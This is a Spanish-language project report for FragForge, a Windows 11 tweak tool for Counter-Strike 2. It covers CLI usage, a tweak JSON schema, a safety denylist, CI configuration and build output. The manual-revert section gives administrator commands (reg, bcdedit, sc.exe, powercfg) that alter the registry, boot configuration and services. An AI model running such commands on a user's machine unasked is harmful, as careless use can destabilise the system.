│  │  ├─ Conditions/                 # ConditionFactory (windows, hybridCpu, gpuVendor, cs2…)
│  │  ├─ Engine/                     # TweakEngine, DependencyResolver, ProfileSelector…
│  │  ├─ Localization/               # Localizer, UiLogSink
│  │  ├─ Logging/                    # JsonDefaults, UiLoggerProvider
│  │  ├─ Models/                     # enums, resultados, snapshot/journal, HardwareProfile
│  │  ├─ Persistence/                # FragForgePaths, FileSnapshotStore, FileJournal, política…
│  │  ├─ Policy/denylist.json        # denylist embebida
│  │  └─ Preflight/
│  ├─ FragForge.Actions/             # implementaciones reales (Windows) + fakes hostiles
│  │  ├─ Bcd/  Diagnostics/  Files/  Network/  Platform/  Power/  Registry/  Scripting/  Services/  Tasks/
│  │  └─ DependencyInjection/
│  ├─ FragForge.Tweaks/              # catálogo JSON embebido, esquema, validador, i18n
│  │  ├─ Catalog/{Cpu,Power,Network,Gpu,Latency,Cs2,Debloat,Memory,Diagnostics}/
│  │  ├─ Localization/{es-MX,en-US}.json
│  │  ├─ Schema/tweak.schema.json
│  │  └─ Validation/
│  ├─ FragForge.Composition/         # CompositionRoot + ReportService (HTML/JSON)
│  ├─ FragForge.Cli/                 # fragforge.exe
│  └─ FragForge.App/                 # FragForge.exe (WPF MVVM, tema oscuro)
└─ tests/FragForge.Tests/            # xUnit 2.9.3: fakes de registro/proceso/servicio/tarea/red
```

## 3. Compilar, probar y publicar

```powershell
# Requisitos: .NET SDK 10.0.400+ y Windows 11 para ejecutar (compilar la App requiere Windows).
dotnet restore FragForge.sln
dotnet build   FragForge.sln -c Release
dotnet test    tests/FragForge.Tests/FragForge.Tests.csproj -c Release

# Cli autocontenido de un solo archivo (win-x64)
dotnet publish src/FragForge.Cli/FragForge.Cli.csproj -c Release -r win-x64 --self-contained true -o publish/cli

# App WPF autocontenida (manifiesto requireAdministrator)
dotnet publish src/FragForge.App/FragForge.App.csproj -c Release -r win-x64 --self-contained true -o publish/app
```

En un entorno sin acceso a nuget.org, usa el modo offline (carpeta de paquetes local):

```powershell
dotnet restore FragForge.sln --configfile .\NuGet.offline.config
```

## 4. Uso del CLI

```text
fragforge scan   [--json] [--culture es-MX|en-US]
fragforge list   [--category Cs2] [--risk Moderate] [--json]
fragforge apply  <ids…|--profile Safe|Balanced|Competitive|Advanced> [--dry-run] [--force]
                 [--no-restore-point] [--enable-system-protection] [--cs2-path RUTA]
                 [--accept-risk ID] [--risk-phrase "ACEPTO EL RIESGO"] [--allow-powershell]
fragforge revert <ids…|--snapshot ID|--last> [--force]
fragforge status [--json]
fragforge snapshot list|create|show [ID] [--label TEXTO] [--no-restore-point]
fragforge export-report --out reporte.html|reporte.json
fragforge doctor [--json]
```

Códigos de salida: `0` éxito · `1` fallo · `2` uso · `3` preflight/catálogo · `4` cancelación · `5` rollback crítico.

Ejemplos:

```powershell
fragforge scan
fragforge apply latency.mouse-acceleration-off latency.game-dvr-capture-off --dry-run
fragforge apply --profile Competitive
fragforge revert --last
fragforge export-report --out "$env:USERPROFILE\Desktop\fragforge.html"
```

## 5. Cómo escribir un tweak

Un archivo JSON por tweak en `src/FragForge.Tweaks/Catalog/<Categoría>/`. Se embebe en el ensamblado y se valida al arrancar.

```jsonc
{
  // Identificador estable, minúsculas con puntos. NUNCA lo cambies tras publicarlo:
  // el journal y los snapshots lo referencian.
  "id": "cs2.example-tweak",
  "category": "Cs2",                       // Cpu|Power|Network|Gpu|Latency|Cs2|Debloat|Memory|Diagnostics
  "title":       { "es-MX": "Título visible", "en-US": "Visible title" },
  "description": { "es-MX": "Qué hace exactamente.", "en-US": "What it does exactly." },
  "evidence": "Medium",                    // High|Medium|Low|Experimental — sin placebo
  "risk": "Moderate",                      // Safe|Moderate|Advanced|Experimental
  "requiresReboot": false,
  "requiresAdmin": true,
  "conditions": [                          // BLOQUEAN si no se cumplen; Unknown ≠ aplicable
    { "type": "windows" },
    { "type": "hybridCpu", "parameters": { "expected": true } }
  ],
  "actions": [
    {
      "kind": "Registry",
      "parameters": {
        "values": [
          { "key": "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SysMain", "name": "Start",
            "kind": "DWord", "value": 4, "mode": "Set" }
          // mode "AddToken" añade un token a un valor REG_SZ existente sin destruir el resto.
        ]
      }
    }
  ],
  "tags": ["opt-in"],                      // "opt-in" lo excluye de Balanced
  "conflictsWith": ["other.tweak"],
  "dependsOn": [],
  "expectedImpact": { "fps": "Bajo/variable", "1%lows": "Posible", "inputLatency": "None" },
  "references": ["https://learn.microsoft.com/…"],   // obligatorio: sin fuente, no hay tweak
  "notes":          { "es-MX": "Honestidad sobre límites.", "en-US": "Honesty about limits." },
  "whenNotToApply": { "es-MX": "Cuándo NO usarlo.",          "en-US": "When NOT to apply." }
}
```

Reglas duras del validador:

1. `id` único, minúsculas, `^[a-z0-9][a-z0-9.-]{2,80}$`.
2. `title`/`description` **en ambos idiomas**.
3. Al menos una `reference` con URL.
4. Acciones `PowerShell` o `Bcdedit` ⇒ `risk` debe ser `Advanced` o `Experimental`.
5. Toda acción mutante exige `requiresAdmin: true`.
6. Sin autociclos (`dependsOn`/`conflictsWith` que se apunten a sí mismos) y sin dependencias/conflictos inexistentes.
7. Cada destino debe pasar la **denylist** en el momento de construir la acción (falla al cargar el catálogo, no al aplicar).

## 6. Seguridad y política

- **Nunca** por defecto: Defender, Firewall, Windows Update, Secure Boot/TPM, mitigaciones de CPU, VBS/HVCI.
- Los tweaks `Advanced`/`Experimental` requieren perfil *Advanced*, `--accept-risk ID` y la frase literal `ACEPTO EL RIESGO`.
- `--force` **solo** omite idempotencia y detección de deriva. No omite denylist, condiciones ni preflight.
- Servicios intocables (entre otros): `WinDefend`, `mpssvc`, `BFE`, `RpcSs`, `DcomLaunch`, `PlugPlay`, `Power`, `EventLog`, `CryptSvc`, `TrustedInstaller`, `ipfsvc`, `jhi_service`, `cplspcon`, `WMIRegistrationService`.
- `FileEdit` rechaza `.exe/.dll/.sys` y rutas de `%SystemRoot%` (solo configuración de texto del usuario/juego).
- `PowerShell` está deshabilitado por defecto, bloquea tokens de red/ejecución dinámica y guarda SHA-256 de los cuatro scripts.

## 7. Reversión manual de emergencia

Ver [`docs/manual-revert.md`](docs/manual-revert.md). Resumen:

1. `%ProgramData%\FragForge\snapshots\<id>\snapshot.json` contiene el estado exacto (tipo y datos) de cada valor, más `artifacts\registry-before.reg`, `*.pow` y `*.bcd`.
2. `fragforge revert --snapshot <id>` es la vía normal.
3. Si el CLI no arranca: importa `artifacts\registry-before.reg` (doble clic / `reg import`), `powercfg /setactive <GUID previo>` usando el snapshot, `bcdedit /import artifacts\bcd-*.bcd` para BCD y restaura los archivos de `artifacts\` con sus rutas y fechas.

## 8. Capa 0 vs Capa 1

La Capa 0 **no mide**; deja ganchos para medir: `IExperimentHook` (`BeforeApply` fatal, `AfterApply`/`AfterRevert` con advertencia), `InspectOnly` como línea base de diagnóstico y `export-report` con JSON/HTML listos para PresentMon, frametimes, 1% lows, DPC/ISR y temperaturas.
````

### `docs/manual-revert.md`  <sub>(88 líneas)</sub>

````markdown
# Reversión manual de emergencia (FragForge Capa 0)

Usa este documento solo si `fragforge revert` no está disponible. **No** edites el journal ni borres snapshots: son tu evidencia.

## 1. Localiza el snapshot

```powershell
Get-ChildItem "$env:ProgramData\FragForge\snapshots" | Sort-Object LastWriteTime -Descending | Select-Object -First 5
Get-Content "$env:ProgramData\FragForge\snapshots\<ID>\snapshot.json" | Select-String -Pattern '"tweakId"' -Context 0,1
```

Cada entrada `actions[]` guarda `$actionState` y los datos exactos:

| `$actionState` | Qué restaurar a mano |
|---|---|
| `registry` | `values[]` con `key`, `name`, `valueExisted`, `valueKind`, `stringData`/`integerData`/`binaryBase64`/`multiStringData` y `missingAncestors` |
| `service` | `startMode`, `state`, `delayedAutoStart`, `delayedAutoStartExisted` |
| `scheduledTask` | `enabled` |
| `powerPlan` | `previousActiveGuid`, `planExisted`, `settings[]` (AC/DC) |
| `bcd` | `element`, `existed`, `previousValue` |
| `network` | `properties[]` con `registryValue` |
| `file` | `path`, `existed`, `contentBase64`, `lastWriteTimeUtc` |
| `script` | `capturedJson` (el script de reversión recibe ese JSON por stdin) |
| `inspection` | nada: solo lectura |

## 2. Registro

```powershell
# Atajo: importa el .reg generado antes de aplicar (solo valores capturados)
reg import "$env:ProgramData\FragForge\snapshots\<ID>\artifacts\registry-before.reg"

# O manualmente, respetando el tipo exacto:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Power\PowerThrottling" /v PowerThrottlingOff /t REG_DWORD /d 0 /f
reg delete "HKCU\Software\Microsoft\GameBar" /v AutoGameModeEnabled /f    # si valueExisted=false
```

Si `valueExisted` es `false`, **elimina** el valor; si `missingAncestors` lista claves, elimínalas solo si están vacías.

## 3. Servicios

```powershell
Set-Service -Name SysMain -StartupType Automatic
sc.exe config SysMain start= auto
Get-Service SysMain | Start-Service
```

Para `delayedAutoStart`, compara con `delayedAutoStartExisted`; si era `false`, borra `DelayedAutostart` (`reg delete "HKLM\SYSTEM\CurrentControlSet\Services\<Servicio>" /v DelayedAutostart /f`).

## 4. Energía

```powershell
powercfg /setactive <previousActiveGuid>          # del snapshot (S-1-...)
powercfg /setacvalueindex <guid> <subgrupo> <ajuste> <acIndex>
powercfg /setdcvalueindex <guid> <subgrupo> <ajuste> <dcIndex>
powercfg /delete <guidDelPlanCreado>              # solo si planExisted era false
```

## 5. BCD

```powershell
bcdedit /enum "{current}" /v
bcdedit /import "$env:ProgramData\FragForge\snapshots\<ID>\artifacts\bcd-disabledynamictick.bcd"
bcdedit /deletevalue "{current}" disabledynamictick     # si existed=false
bcdedit /set "{current}" disabledynamictick No          # si previousValue=No
```

## 6. Red

```powershell
Set-NetAdapterAdvancedProperty -Name "Ethernet" -RegistryKeyword "*EEE" -RegistryValue 1
```

## 7. Archivos

Decodifica `contentBase64` y escribe los bytes; repón `lastWriteTimeUtc`. Si `existed=false`, elimina el archivo y los directorios vacíos que FragForge creó.

## 8. Punto de restauración

`RestorePointSequence` en el snapshot corresponde al punto creado. En Windows 11: *Crear un punto de restauración* → *Restauración del sistema* → elige el punto con la fecha indicada. Requiere Protección del sistema activada.

## 9. Verificación final

```powershell
fragforge status
fragforge scan
```

Ambos deben mostrar `journal íntegro` y los tweaks revertidos en `NotApplied` (o `AppliedExternally` si el sistema ya coincidía por otra herramienta, p. ej. Atlas).
````

### `.github/workflows/ci.yml`  <sub>(49 líneas)</sub>

````yaml
name: build

on:
  push:
    branches: [ main ]
  pull_request:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  linux-core:
    name: Core + Actions + Tweaks + Composition + Tests (ubuntu)
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '10.0.x'
      - name: Restore (CLI and App excluded; Windows-only)
        run: dotnet restore tests/FragForge.Tests/FragForge.Tests.csproj
      - name: Build (warnings as errors in Core)
        run: dotnet build tests/FragForge.Tests/FragForge.Tests.csproj -c Release --no-restore
      - name: Test
        run: dotnet test tests/FragForge.Tests/FragForge.Tests.csproj -c Release --no-build --logger "trx;LogFileName=results.trx"
      - uses: actions/upload-artifact@v4
        if: always()
        with:
          name: test-results
          path: '**/TestResults/results.trx'

  windows-full:
    name: Solution completa + publish (windows)
    runs-on: windows-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-dotnet@v4
        with:
          dotnet-version: '10.0.x'
      - run: dotnet restore FragForge.sln
      - run: dotnet build FragForge.sln -c Release --no-restore
      - run: dotnet test tests/FragForge.Tests/FragForge.Tests.csproj -c Release --no-build
      - run: dotnet publish src/FragForge.Cli/FragForge.Cli.csproj -c Release -r win-x64 --self-contained true -o publish/cli -p:PublishSingleFile=true
      - run: dotnet publish src/FragForge.App/FragForge.App.csproj -c Release -r win-x64 --self-contained true -o publish/app -p:PublishSingleFile=true
      - uses: actions/upload-artifact@v4
        with:
          name: fragforge-win-x64
          path: publish/
````

---

## 3i. Catálogo de semillas — tabla resumen

| ID | Cat. | Evidencia | Riesgo | opt-in | Reboot | Acciones | Condiciones | Archivo |
|---|---|---|---|:-:|:-:|---|---|---|
| `cpu.power-throttling-off` | Cpu | Medium | Moderate | no | sí | Registry | windows, hybridCpu | `src/FragForge.Tweaks/Catalog/Cpu/cpu.power-throttling-off.json` |
| `cs2.cpu-priority-high` | Cs2 | Medium | Moderate | no | no | IfeoPerfOptions | windows | `src/FragForge.Tweaks/Catalog/Cs2/cs2.cpu-priority-high.json` |
| `cs2.fullscreen-optimizations-off` | Cs2 | Experimental | Experimental | sí | no | Registry | windows, userHive, cs2 | `src/FragForge.Tweaks/Catalog/Cs2/cs2.fullscreen-optimizations-off.json` |
| `diagnostics.system-inspect` | Diagnostics | High | Safe | no | no | InspectOnly | windows | `src/FragForge.Tweaks/Catalog/Diagnostics/diagnostics.system-inspect.json` |
| `latency.game-dvr-capture-off` | Latency | High | Moderate | no | sí | Registry | windows, userHive | `src/FragForge.Tweaks/Catalog/Latency/latency.game-dvr-capture-off.json` |
| `latency.game-mode-on` | Latency | Medium | Safe | no | no | Registry | windows, userHive | `src/FragForge.Tweaks/Catalog/Latency/latency.game-mode-on.json` |
| `latency.global-timer-resolution` | Latency | Medium | Moderate | no | sí | Registry | windows | `src/FragForge.Tweaks/Catalog/Latency/latency.global-timer-resolution.json` |
| `latency.mouse-acceleration-off` | Latency | High | Safe | no | sí | Registry | windows, userHive | `src/FragForge.Tweaks/Catalog/Latency/latency.mouse-acceleration-off.json` |
| `network.i225v-eee-off` | Network | Medium | Moderate | sí | no | NetAdapterProperty | windows, adapter | `src/FragForge.Tweaks/Catalog/Network/network.i225v-eee-off.json` |
| `power.fragforge-performance` | Power | Medium | Moderate | sí | no | PowerPlan | windows | `src/FragForge.Tweaks/Catalog/Power/power.fragforge-performance.json` |

**Perfiles:** `Safe` = solo riesgo Safe sin `opt-in`; `Balanced` = Safe+Moderate sin experimental ni `opt-in`; `Competitive` = Safe+Moderate (incluye `opt-in`); `Advanced` = todo, y todo tweak Advanced/Experimental exige además `--accept-risk <id>` + `--risk-phrase "ACEPTO EL RIESGO"`.

Los 10 seeds están en `src/FragForge.Tweaks/Catalog/<Categoría>/` y su contenido completo está en `03c-tweaks.md`.

---

---

## 4. Comandos exactos de restore/build/test/publish

### 4.1 En tu PC (Windows 11, red normal)

```powershell
# Requisitos: .NET SDK 10.0.400 o superior; Visual Studio 2022 17.14+ (opcional, solo para la App)
git clone https://github.com/EvoMaxPC/Evo_optimizer_CS2.git
cd Evo_optimizer_CS2
git checkout arena/c1a5f702-evo-optimizer-cs2

dotnet restore FragForge.sln
dotnet build   FragForge.sln -c Release          # debe dar 0 warnings / 0 errores
dotnet test    tests/FragForge.Tests/FragForge.Tests.csproj -c Release
```

### 4.2 Publicar los ejecutables (win-x64, self-contained, un solo archivo)

```powershell
dotnet publish src/FragForge.Cli/FragForge.Cli.csproj -c Release -r win-x64 --self-contained true `
  -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true -p:EnableCompressionInSingleFile=true `
  -p:PublishTrimmed=false -o publish\cli

dotnet publish src/FragForge.App/FragForge.App.csproj -c Release -r win-x64 --self-contained true `
  -p:PublishSingleFile=true -p:IncludeNativeLibrariesForSelfExtract=true -p:EnableCompressionInSingleFile=true `
  -p:PublishTrimmed=false -o publish\app
```

> **Nota importante:** `RuntimeIdentifier`, `SelfContained` y `PublishSingleFile` **solo** se aplican cuando se pasa `-r win-x64` (están condicionados en el `.csproj`). Así `dotnet build` funciona también en Linux/macOS para Core/Actions/Tweaks/Composition/Tests. La App WPF solo compila en Windows (o con `EnableWindowsTargeting` + *targeting pack* del SDK).

Ambos binarios llevan `app.manifest` con `requestedExecutionLevel level="requireAdministrator"`, DPI awareness *per-monitor v2* y `supportedOS` Windows 10/11.

### 4.3 Ejecución

```powershell
# CLI
.\publish\cli\fragforge.exe doctor
.\publish\cli\fragforge.exe scan
.\publish\cli\fragforge.exe apply latency.mouse-acceleration-off --dry-run
.\publish\cli\fragforge.exe apply --profile Balanced
.\publish\cli\fragforge.exe status
.\publish\cli\fragforge.exe revert --last
.\publish\cli\fragforge.exe export-report --out "$env:USERPROFILE\Desktop\fragforge.html"

# App
.\publish\app\FragForge.exe
```

Códigos de salida: `0` éxito · `1` fallo · `2` uso · `3` preflight/catálogo · `4` cancelación · `5` rollback crítico.

### 4.4 Comandos usados en el sandbox (solo referencia, Linux sin red a nuget.org)

```bash
export DOTNET_ROOT=/home/user/.fragforge-tools/dotnet
D=$DOTNET_ROOT/dotnet
$D restore FragForge.sln --configfile /home/user/.fragforge-tools/probe/nuget.config
$D build   FragForge.sln -c Release --no-restore
$D test    tests/FragForge.Tests/FragForge.Tests.csproj -c Release --no-build
$D src/FragForge.Cli/bin/Release/net10.0/fragforge.dll scan --data-root /tmp/ff
```

**Salida real del sandbox (verificado):**

```text
FragForge.Core        -> …/FragForge.Core.dll
FragForge.Actions     -> …/FragForge.Actions.dll
FragForge.Tweaks      -> …/FragForge.Tweaks.dll
FragForge.Composition -> …/FragForge.Composition.dll
FragForge.Tests       -> …/FragForge.Tests.dll
FragForge.App         -> …/FragForge.dll
FragForge.Cli         -> …/fragforge.dll
Build succeeded.  0 Warning(s)  0 Error(s)

Passed! - Failed: 0, Passed: 103, Skipped: 0, Total: 103
```

### 4.5 Primer uso recomendado en el PN64

```powershell
fragforge doctor                       # ¿preflight apto? ¿System Protection activa?
fragforge scan                         # perfil de hardware + estado de los 10 tweaks
fragforge apply --profile Safe --dry-run
fragforge apply latency.mouse-acceleration-off      # 1 tweak, con punto de restauración
fragforge status
fragforge revert --last                 # verifica vuelta exacta al estado previo
```

## 5. Supuestos y limitaciones (honestas, verificables)

### 5.1 Qué está verificado y qué no

| Área | Estado | Detalle |
|---|---|---|
| Compilación de los 7 proyectos | **Verificado** (sandbox Linux, SDK 10.0.400) | 0 warnings / 0 errores, incluida la App WPF con `EnableWindowsTargeting`. |
| 103 tests xUnit | **Verificado** | Motor, catálogo, acciones y composición sobre fakes. |
| CLI (`scan`, `apply --dry-run`, `revert` lógico, `doctor`, códigos de salida) | **Verificado** en Linux | En Linux la plataforma se reporta no soportada y todo queda `NotApplicable` (por diseño). |
| Adaptadores reales en Windows (registro, WMI, powercfg, bcdedit, servicios, tareas, NetAdapter, System Restore) | **NO ejecutado** aún | Requieren el PN64. Están aislados tras interfaces y cubiertos por fakes; quedan pendientes de la primera pasada real. |
| `SystemRestoreService.GetProtectionStateAsync` | **Heurística no validada** | No existe API/WMI documentada para el estado de protección *por unidad*. Se usa `Win32_Volume` ↔ `Win32_ShadowStorage`, con *fallback* `Unknown`. Si `Unknown`, el preflight bloquea salvo `--no-restore-point` o `--enable-system-protection`. **Validar en el PN64 el primer día.** |
| `bcdedit /enum {current} /v` para leer `disabledynamictick` | A validar | Si el elemento no aparece, se asume `existed=false` y el revert hará `bcdedit /deletevalue`. Verificar que el parseo funciona con la salida en es-MX. |
| Detección de Atlas | Heurística de baja/media confianza | Organización en registro, carpeta `ProgramData\Atlas`, servicios SysMain/WSearch/Spooler/DiagTrack detenidos. **No** se afirma con certeza: solo se usa para *no pisar* cambios (`AppliedExternally`). |
| Canal de RAM | **Unknown por defecto** | `Win32_PhysicalMemory` describe módulos, no el entrelazado. Dos DIMM no prueban dual-channel. El tweak de canales nunca se aplica sobre `Unknown`. |
| PL1/PL2 | No disponible por WMI | En el PN64 los gobierna DTT/IPF (`WMIRegistrationService`). El profiler reporta `Unknown` con nota; **no se inventan valores**. |

### 5.2 Limitaciones de diseño (deliberadas)

1. **Sin medición.** La Capa 0 no mide FPS ni frametime. `cpu.power-throttling-off`, `latency.global-timer-resolution` y `power.fragforge-performance` están marcados Medium/opt-in precisamente porque su beneficio depende del equipo y puede empeorar temperatura/consumo. Se aplican solo en perfil Competitive/Advanced y con A/B en Capa 1.
2. **`GlobalTimerResolutionRequests`** no es una API documentada como contrato público (sí el mecanismo `timeBeginPeriod`). Por eso evidencia Medium + advertencia de consumo.
3. **IFEO `CpuPriorityClass`** puede no "pegarse" en algunas builds de Win11; el motor lo detecta porque hace `Verify` después de aplicar y, si no coincide, revierte y falla el tweak (no deja estado a medias).
4. **El tweak de fullscreen optimizations** es Experimental: depende de flip model, ventana sin bordes y driver Intel. Requiere perfil Advanced + aceptación por ID + frase literal.
5. **`mouse-acceleration-off` afecta a todo el escritorio** (no solo CS2) y requiere cerrar sesión. CS2 puede usar raw input y no verse afectado; el texto del tweak lo dice explícitamente.
6. **La App WPF** no tiene visor de snapshots ni editor de catálogo (fuera del alcance de Capa 0): permite escanear, seleccionar, dry-run, aplicar, revertir, snapshot manual, doctor, exportar informe y ver logs.
7. **Un solo usuario objetivo.** `HKCU` se resuelve al SID interactivo (`HKU\<SID>`), nunca al hive del proceso elevado. Si el SID no se resuelve, las acciones de usuario fallan en lugar de escribir en el lugar equivocado.
8. **Sin compresión de snapshots.** `snapshot.json` incluye la definición completa + estados; para 10 tweaks es de pocos KB. `FileEdit` limita a 1 MiB por archivo para no inflar los snapshots.
9. **Sin firma de código.** Los binarios no están firmados; SmartScreen puede advertir. No afecta a la lógica pero es requisito para distribución pública.
10. **SHA-256 del journal no es defensa criptográfica fuerte** (no hay HMAC con secreto): detecta edición accidental o torpe, no un atacante con acceso administrativo. Con admin, todo es reconstruible de todos modos; el objetivo es la integridad operativa.

### 5.3 Compatibilidad con Atlas Playbook v0.5.0

* Atlas ya desactivó `SysMain`, `WSearch`, `Spooler`, `DiagTrack`: FragForge **lo detecta** (servicios no corriendo / valores ya presentes) y marca `AppliedExternally` **sin sobrescribir**, salvo `--force` explícito.
* Ningún tweak de la Capa 0 toca los servicios que Atlas gestiona: el catálogo no contiene acciones `Service` en esta capa (la infraestructura existe y está probada, pero sin semillas que luchen contra Atlas).
* Los tweaks con `opt-in` (plan de energía, EEE, fullscreen) quedan **fuera** de Balanced: no se aplican por accidente sobre una configuración ya ajustada.

### 5.4 Riesgos residuales conocidos

| Riesgo | Mitigación implementada |
|---|---|
| Rollback a medias por fallo de disco/permisos | Journal + snapshot en `%ProgramData%`; código de salida 5; guía manual en `docs/manual-revert.md`. |
| Punto de restauración limitado a 24 h | Se pone `SystemRestorePointCreationFrequency=0` temporalmente y se restaura el valor original en `finally`. |
| Protección del sistema desactivada | Preflight bloquea; `--enable-system-protection` la habilita y **verifica** que quedó activa antes de aplicar. |
| Reinicio pendiente / TiWorker activo | Preflight bloquea; `--force` no lo omite. |
| Cancelación a mitad de lote | El tweak en curso revierte; lo ya aplicado permanece y es reversible por snapshot (`--last`). |
| Denylist insuficiente | Fusionable desde `%ProgramData%\FragForge\policy\denylist.json` sin recompilar. |

## 6. Contrato para la Capa 1 (medición A/B y diagnóstico extendido)

La Capa 1 **no necesita cambiar el motor**: los cuatro puntos de extensión ya existen y están tipados.

### 6.1 Ganchos de experimento (`IExperimentHook`)

```csharp
public interface IExperimentHook
{
    int Order { get; }
    Task<IReadOnlyList<ExperimentArtifact>> RunAsync(ExperimentContext context, CancellationToken cancellationToken = default);
}
public sealed record ExperimentContext(string OperationId, string? SnapshotId, ExperimentPhase Phase, TweakDefinition Tweak, HardwareProfile Hardware, DateTimeOffset Timestamp, string? ArtifactDirectory = null);
public enum ExperimentPhase { BeforeApply, AfterApply, AfterRevert }
```

Semántica garantizada por `TweakEngine`:

| Fase | Cuándo | Fallo |
|---|---|---|
| `BeforeApply` | Después del snapshot, **antes** de aplicar cualquier acción | **Fatal**: la aplicación se aborta y no se toca el sistema |
| `AfterApply` | Tras `Verify` correcto de todas las acciones del tweak | **Advertencia** en `TweakApplyResult.Warnings`; no revierte |
| `AfterRevert` | Tras `VerifyRevert` correcto | Advertencia |

Cada hook recibe `ArtifactDirectory` (dentro del snapshot) y devuelve `ExperimentArtifact(Name, Path, ContentType)`; el motor escribe `HookCompleted` en el journal con la cuenta de artefactos.

**Cómo enchufar PresentMon en Capa 1** (sin recompilar Core):

```csharp
public sealed class PresentMonBaselineHook(IProcessRunner runner) : IExperimentHook
{
    public int Order => 10;
    public async Task<IReadOnlyList<ExperimentArtifact>> RunAsync(ExperimentContext ctx, CancellationToken ct)
    {
        var dir = ctx.ArtifactDirectory ?? throw new InvalidOperationException("sin directorio de artefactos");
        var csv = Path.Combine(dir, $"presentmon-{ctx.Phase}-{ctx.Tweak.Id}.csv");
        await runner.RunAsync(new ProcessRequest
        {
            FileName = "PresentMon.exe",
            Arguments = ["--process_name", "cs2.exe", "--output_file", csv, "--terminate_on_proc_exit", "--stop_existing_session"],
            Timeout = TimeSpan.FromMinutes(5)
        }, ct);
        return [new ExperimentArtifact("presentmon", csv, "text/csv")];
    }
}
// registro:
services.AddSingleton<IExperimentHook, PresentMonBaselineHook>();
```

> Regla de diseño para Capa 1: los hooks **no** pueden modificar el sistema. Si un hook necesita cambiar algo (p. ej. fijar afinidad para medir), debe ser un `ITweakAction` con captura/reversión, no un hook.

### 6.2 Línea base de diagnóstico ya implementada (`InspectOnly`)

El tweak `diagnostics.system-inspect` es **solo lectura** y alimenta el informe con `DiagnosticObservation(Key, Value, Source, Confidence, Note)`:

| Clave | Fuente | Nota de honestidad |
|---|---|---|
| `hags` | `HwSchMode` | Ausente ⇒ "comportamiento predeterminado del driver", no "desactivado" |
| `mpo` | `OverlayTestMode` | Solo `5` se interpreta como override conocido |
| `vbs` / `hvci` | DeviceGuard WMI + registro | `Unknown` si no hay evidencia |
| `secureBoot` | Registro + `Confirm-SecureBootUEFI` | `Unknown` si falla la consulta |
| `dualChannel` | `Win32_PhysicalMemory` | **Nunca** infiere dual desde 2 módulos |
| `powerLimits` | PL1/PL2 | `Unknown` si DTT/IPF gobierna (caso PN64) |
| `ssdHealth` | `MSFT_PhysicalDisk` + SMART | Salud básica, no sustituye análisis completo |

Para Capa 1 se añaden probes nuevos **sin tocar el motor**: implementan `IDiagnosticProbe` (`string Key`, `Task<DiagnosticObservation> ReadAsync(HardwareProfile, CancellationToken)`) y se registran en `DiagnosticProbeFactory`/DI. Candidatos: `dpcIsr` (ETW/xperf), `temperature` (LibreHardwareMonitor opcional, nunca driver propio), `frametime` (PresentMon), `powerDraw` (MSR solo si se decide explícitamente y con advertencia).

### 6.3 Informe listo para Capa 1 (`export-report`)

`ReportDocument` (JSON schema version 1) ya contiene todo lo que un motor de A/B necesita como contexto:

```csharp
public sealed record ReportDocument(
    int SchemaVersion, DateTimeOffset CreatedAt, string ApplicationVersion,
    HardwareProfile Hardware, IReadOnlyList<TweakStatus> Tweaks, PreflightReport Preflight,
    IReadOnlyList<SnapshotListItem> Snapshots, JournalIntegrity JournalIntegrity,
    IReadOnlyList<JournalEntry> RecentJournal);
```

`export-report --out x.html|json` produce ambos formatos. Los `TweakStatus` incluyen `Observations` (de `InspectOnly`), de modo que un experimento A/B puede correlacionar "antes/después" con el estado real de HAGS/VBS/plan de energía.

### 6.4 Datos que la Capa 1 debe añadir (contrato concreto)

1. **`BenchmarkSession`** ya está modelado (`Id`, `Label`, `Measurements`, `Artifacts`) y `BenchmarkMeasurement(Metric, Value, Unit, Metadata)`. Métricas previstas: `avgFps`, `p1Low`, `p01Low`, `frametimeP99`, `gpuBusyP95`, `cpuBusyP95`, `dpcTime`, `isrTime`, `cpuPackageTempC`, `packagePowerW`, `vramUsedMb`.
2. **Persistencia propuesta:** `%ProgramData%\FragForge\experiments\<sessionId>\` con `session.json` + CSV de PresentMon + captura de diagnóstico, referenciando `SnapshotId` y `OperationId`.
3. **Regla estadística mínima:** misma escena/demo, misma resolución y plan de energía, ≥ 3 repeticiones de 120 s, comparación por mediana y reporte de dispersión. **Sin esto, ningún tweak se promociona de Medium a High.**
4. **Promoción de evidencia:** un tweak solo sube de `EvidenceLevel` si un experimento A/B reproducible en el PN64 muestra mejora fuera del ruido; en caso contrario se degrada o se retira (política anti-placebo).
5. **Seguridad:** la Capa 1 no debe leer memoria de `cs2.exe` ni inyectar código. PresentMon usa ETW del sistema operativo (compatible con VAC/FACEIT); cualquier otra vía queda descartada por diseño.

### 6.5 Puntos de extensión que **no** deben romperse

* `ITweakAction` (7 métodos) y el discriminador `$actionState` de `ActionState`.
* `ITweakActionFactory.Create` y el registro de 10 tipos (`Registry`, `IfeoPerfOptions`, `Service`, `ScheduledTask`, `PowerPlan`, `Bcdedit`, `NetAdapterProperty`, `FileEdit`, `PowerShell`, `InspectOnly`).
* Formato de `SystemSnapshot` (`SchemaVersion = 1`) y de `JournalEntry` (cadena `PreviousHash`/`Hash`): cambiarlos exige migración.
* Rutas bajo `%ProgramData%\FragForge\` (`snapshots`, `journal`, `logs`, `reports`, `policy`, `.fragforge.lock`).
* Los códigos de salida del CLI (0/1/2/3/4/5) y la frase de riesgo literal `ACEPTO EL RIESGO`.

---

---

## Fin del informe

Generado desde el árbol de trabajo del commit `a2c5429` de la rama `arena/c1a5f702-evo-optimizer-cs2`.

---
